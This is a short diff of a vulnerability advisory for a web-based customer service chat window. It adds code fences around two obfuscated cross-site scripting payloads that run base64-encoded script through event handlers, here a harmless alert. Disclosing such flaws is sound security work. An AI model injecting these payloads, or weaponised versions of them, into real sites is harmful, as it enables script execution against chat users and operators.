@@ -19,10 +19,11 @@ Version: < 2.0.0.2
 Tested on: macOS
 
 ## POC:
-
+```
 1、<input type=text autofocus onfocus=window[490837..toString(1<<5)](atob('YWxlcnQoMSk='))//
 
 2、<details open ontoggle=window[490837..toString(1<<5)](atob('YWxlcnQoMSk='))>
+```
 
 ## verification：
 Open 53 online customer service chat window to inject POC
